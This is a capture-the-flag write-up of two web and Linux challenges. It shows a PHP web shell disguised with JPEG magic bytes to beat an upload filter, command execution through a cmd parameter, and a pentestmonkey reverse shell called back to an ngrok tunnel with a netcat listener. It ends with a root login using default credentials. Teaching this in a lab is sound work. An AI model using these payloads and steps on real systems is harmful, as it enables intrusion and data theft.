<h2>Hacker WEB -- 1500 Point</h2>

![image](https://user-images.githubusercontent.com/67879936/222437839-35208f50-0abc-4a67-922f-8ace04c55c0a.png)

We were given a url to go to, going over to the webpage should get you something like this

![image](https://user-images.githubusercontent.com/67879936/222437953-1dea51b4-21f6-49ef-8876-fb617c84ab93.png)

From the above screenshot we can see that we are allowed to upload an image. I went over to check the contents of the source page so as to see if Muzec left any hint lool

![image](https://user-images.githubusercontent.com/67879936/222438054-1849c1a4-0225-4831-a85b-798c3ad5b02c.png)

Ohh, Muzec actually wrote something there but trust me there was no meaning to what was there xD. So, I went ahead to fire up gobuster so as to check for hidden directories.

>command:gobuster dir -u http://185.203.119.220:8001/ -w /usr/share/dirb/wordlists/common.txt 16 -x php,html,txt,zip,bak,backup

![image](https://user-images.githubusercontent.com/67879936/222438465-ed2d8d79-23b1-4ba4-b41d-404e6faeb3b6.png)

Alright, so we found 3 directories. Lets navigate to those directories to see what is there

<h3>/images</h3>

![image](https://user-images.githubusercontent.com/67879936/222438605-841ef13d-0f0b-4625-a4cf-a54d43493751.png)

oops, we got a “Not Found” error. Moving on to the next directory

<h3>/upload.php</h3>

![image](https://user-images.githubusercontent.com/67879936/222438719-8d5d9151-79e4-4fa0-b1b1-586cfee7ff8e.png)

This directory led us back to the home directory. Moving on to the last directory

<h3>/uploads.php</h3>

![image](https://user-images.githubusercontent.com/67879936/222439001-eeeab0a6-2a4b-46fd-b2d7-49d337281e5a.png)

we also got a “Not Found” error for this. At this point I was like “Muzec, what’s this??” lool.

Going back to the webpage, I actually went ahead to try to upload a _.jpeg_ for a start

![image](https://user-images.githubusercontent.com/67879936/222439401-902d81ec-cb76-471c-849b-947ab3d7bf9f.png)

I got this error when I tried to upload a .jpeg file. At this point I knew there was kind of like a filter that filters the files we upload. So, there are two conditions

1.Upload a .jpeg file
2.The maximum size of the .jpeg file must be 35 bytes

Now, in my mind I was like bypassing the .jpeg condition won’t be difficult, the issue will be the size of the file I want to upload. That is, it must not exceed 35 bytes. At this point I became lost lool. When doing my research I found this

>link:https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/

From the page I got a simple php bypass payload to use

![image](https://user-images.githubusercontent.com/67879936/222439719-2c33fdd9-df58-4316-a3f0-7eccff837b38.png)

With this, I can trick the filter into thinking the .php file I want to upload is actually a .jpeg file. But I had to modify mine a little.

```payload:AAAA<?php system($_GET[‘cmd’]); ?>```

I stored the payload in a file (abeg.php), then I used a tool “hexeditor” to change the abeg.php header to that of a .jpeg header.

![image](https://user-images.githubusercontent.com/67879936/222441535-caf6bfd6-4d65-4ec7-8d81-7517fd639571.png)

Now, lets go ahead and use hexeditor to change the content of the header

>command:hexeditor abeg.php

![image](https://user-images.githubusercontent.com/67879936/222441796-92dce8c9-a974-4076-bfae-4c1633a37b8e.png)

From the above screenshot, you will see that the ```AAAA``` has the header ```41 41 41 41```, now lets change the header to that of a .jpeg file. Checking it up online I found this ```FF D8 FF EE```. So, let’s change the header to that

![image](https://user-images.githubusercontent.com/67879936/222442035-041b2d28-48f2-4c34-86da-9f9e7f994a1f.png)

Now that we have changed the header, lets save it and exit (hit ctrl +x, then hit the enter button to exit).

Using the cat command to read the file you will observe it is different from what we initially put there

![image](https://user-images.githubusercontent.com/67879936/222442236-39bd5b15-2268-4f8b-a054-32bf2c99ef8e.png)

Now, that we have successfully changed the header. Lets go ahead and upload it

![image](https://user-images.githubusercontent.com/67879936/222442315-61c3358b-2e02-475e-b438-c076ccaf5986.png)

boom, we bypassed those filters hehe. At this point I was like “Muzec I am coming for you xD”.

So, going to the _/upload_ directory to find my file, I saw this

![image](https://user-images.githubusercontent.com/67879936/222442468-7132ccea-1ad4-48d8-897f-1d43ddb67d2e.png)

Nice, the above screenshot actually means we found our file hehe.

Now, lets go ahead and exploit this bad boy. If you recall, we pasted a php payload in the abeg.php file, now what this payload will do is that it will lead to a command injection vulnerability. Interesting right??

>link: http://185.203.119.220:8001/uploads/abeg.php?cmd=id

You going to that link should get you something like this

![image](https://user-images.githubusercontent.com/67879936/222443770-be84b61d-36b5-42e6-ba87-0a93fb5f44b3.png)

Lets try reading the /etc/passwd file also

>link:http://185.203.119.220:8001/uploads/abeg.php?cmd=cat /etc/passwd

![image](https://user-images.githubusercontent.com/67879936/222443911-eff89710-f8c9-4e28-9c5e-4b9bc0031ec0.png)

Now, lets try to read the flag. After searching for a while I didn’t find anything, then I recalled that during our enumeration we found a /upload.php file. Then, I went ahead to check the content of the file

>link:http://185.203.119.220:8001/uploads/abeg.php?cmd=cat /var/www/html/upload.php

![image](https://user-images.githubusercontent.com/67879936/222444041-a5a7c8e7-8841-4843-b79c-dbee8f965283.png)

oops, didn’t see anything that looks like a flag here. After a while, my teammate told me to use curl to read the file. I was like “wow, so truee”. Then I went ahead to use curl to read the content of upload.php.

>command:curl http://185.203.119.220:8001/uploads/abeg.php?cmd=cat%20/var/www/html/upload.php

![image](https://user-images.githubusercontent.com/67879936/222444251-be5631b2-a403-4115-81b7-3925915b5468.png)

Boom, we got the flag hehe.

Flag: ```abcctf{UP104D_F0rM_N07_7H47_53CUr3}```





<h2>Method Linux -- 1000 Point</h2>

![image](https://user-images.githubusercontent.com/67879936/222445231-58508498-f7b2-495e-ba7c-9f1b240b375e.png)

<h2>Recon</h2>

<h3>PortScanning</h3>

>command:sudo nmap -A 185.203.119.220 -v -p8003 -T4

![image](https://user-images.githubusercontent.com/67879936/222445701-8decf06e-1afe-4be8-a292-41def48cf62e.png)


<h2>Enumeration</h2>

Lets go to the webpage to see what's there

![image](https://user-images.githubusercontent.com/67879936/222447390-24ae72c2-6f17-426d-b944-4b53b4bac4e9.png)

From the above screenshot we can see that we have http apache service running on that port

Let’s go ahead and view the source page of this webpage for hidden information.

>Note:Always go over source pages because the source page might contain some vital information

![image](https://user-images.githubusercontent.com/67879936/222447561-14ffe529-40dd-4e83-bb28-bb073b8f6bfc.png)

Alright, Muzec actually left something in the source code, ```abcctf should help you in your journey```. At first I was like it’s probably a rabbit hole, so I continued with my enumeration.

Lets fire up ffuf to help search for hidden directories

>command:ffuf -u “http://185.203.119.220:8003/FUZZ/" -w /usr/share/dirb/wordlists/common.txt -e .php,.backup,.bak,.html,.zip,.txt

![image](https://user-images.githubusercontent.com/67879936/222447775-a3f97bf7-d1bf-423e-a18d-918452efd40e.png)

Okay we have 4 directories here, _/_backup, /icons, /webdav, /wordpress_. At first when I saw the _/wordpress_ I was kinda happy because I was hoping to see something, unfortunately it was a rabbit hole designed by Muzec, and I was right there swimming inside the rabbit hole lool. I checked the other directories but couldn’t find anything.

Going over to the _/webdav_ directory should get you something like this

![image](https://user-images.githubusercontent.com/67879936/222448204-bd04cdb5-8b98-4dc3-bdba-a9b9d2699ed9.png)

Seeing this I remembered solving a room that has a similar directory, then I checked my note and found the default credentials I used then

```username: wampp```         ```password: xampp```

Trying the credentials didn’t work, it was at this time I knew that Muzec was actually after my life lool. After thinking for a while I went back to what Muzec wrote in the source code “abcctf should help you in your journey”. It was at this point I told myself that what If Muzec was actually trying to help us here. Lo and behold, he really was trying to help us lool. I actually went ahead to use “abcctf” as the credentials.

```username: abcctf```         ```password: abcctf```

![image](https://user-images.githubusercontent.com/67879936/222448522-c7d9f2b6-da33-4956-ac8e-f3a5a112c599.png)

Checking the nothing.txt file, you should see a message from Muzec

![image](https://user-images.githubusercontent.com/67879936/222448614-9d933dee-1590-4f56-ae61-844c91bea471.png)

scrolling all the way down you should see this

![image](https://user-images.githubusercontent.com/67879936/222448730-d6187907-2b9f-4cd1-a999-2bbacb817d4d.png)

Okay, Muzec actually gave a piece of advice and this is to prevent other users from using the shell you uploaded to get access.

<h2>Exploitation</h2>

Now, that we can’t find anything again we are going to use a tool called “cadaver” to upload our reverse shell

>command:cadaver http://185.203.119.220:8003/webdav/

![image](https://user-images.githubusercontent.com/67879936/222449023-a1f9f4d1-9f89-45ba-845f-3f4745e86760.png)

What we will do now is upload a .php shell so as to get a reverse shell back to our machine and we will be using ngrok for this

To know more about ngrok, 

>visit: https://ngrok.com/

>command:./ngrok tcp 1337

1337 is the port we are actually going to listen on. This means we will set up our netcat listener in another terminal

>command:rlwrap nc -lvnp 1337

![image](https://user-images.githubusercontent.com/67879936/222449253-80abc34d-3558-49cb-bc31-a17ac9427a4c.png)

From the above screenshot, we can say

```IP:4.tcp.eu.ngrok.io```      ```Port:18124```

Note: The ip and port I have above will be different from yours, so you are going to get it when you run the ngrok command

Now, this will be the IP and PORT we will use when cooking our reverse shell. For this machine we are going to be using the php-pentestmonkey shell.

You can get the shell here: https://github.com/pentestmonkey/php-reverse-shell.git

Open the .php file in any editor of your choice and change the $ip and $port

![image](https://user-images.githubusercontent.com/67879936/222449644-d9f84488-090f-447e-9b6f-daac49a04a1b.png)

Take a close look at the $ip and $port from the above screenshot. After doing this lets go ahead and upload the file using the “_put_” command on cadaver

>Note:Ensure you run cadaver in the directory where your .php shell is located

![image](https://user-images.githubusercontent.com/67879936/222449774-7a467f78-db00-4dd0-87a8-ae620fe6e6ac.png)

Now that we have successfully uploaded our shell, lets go ahead and execute the shell since we have our netcat listener running already

>link:http://185.203.119.220:8003/webdav/hehehe.php

![image](https://user-images.githubusercontent.com/67879936/222449935-c434f07c-94e8-4718-9b3e-449a1dec7790.png)

![image](https://user-images.githubusercontent.com/67879936/222449976-06b6ebfa-e29a-4ef4-a487-7fdbc7349eed.png)

cool, we got ourselves a shell as user “www-data”

We can stabilize this shell using the following command

```
python3 -c “import pty;pty.spawn(‘/bin/bash’)”
ctrl + z (to background)
stty raw -echo && fg
export TERM=xterm
```

![image](https://user-images.githubusercontent.com/67879936/222450133-b563686d-b077-4ccf-b7d5-839b0d71e157.png)

Now that our shell is stabilized let’s go ahead and delete the shell we uploaded so as to prevent other players from gaining access with it or getting a hint from it.

>command:delete hehehe.php

![image](https://user-images.githubusercontent.com/67879936/222450329-ff21a6dc-41f8-4030-b9ae-9673a19c9812.png)


<h2>Privilege Escalation</h2>

After checking for a while, I noticed that there are only 2 users, “www-data” and “root”. So, I decided to escalate my privileges. After enumerating for so long I decided to try default passwords for the root user, and of those passwords worked hehe.

```username: root```      ```password: toor```

![image](https://user-images.githubusercontent.com/67879936/222450618-dc905131-d63a-4bb7-814a-4ad457f891a8.png)

Now that we are root it’s time to find the flag. To save us the stress of checking each directories, we can go ahead to use the “find” command to sniff the flag out lool

>command:find / 2>/dev/null | grep -i “flag.txt”

![image](https://user-images.githubusercontent.com/67879936/222450746-0ce94bf3-1db8-40cb-94e8-cec1d12e5fc3.png)

Boom, we got the flag

flag:```abcctf{345Y_r007_W17H_D3F4U17_Cr3D5}```






















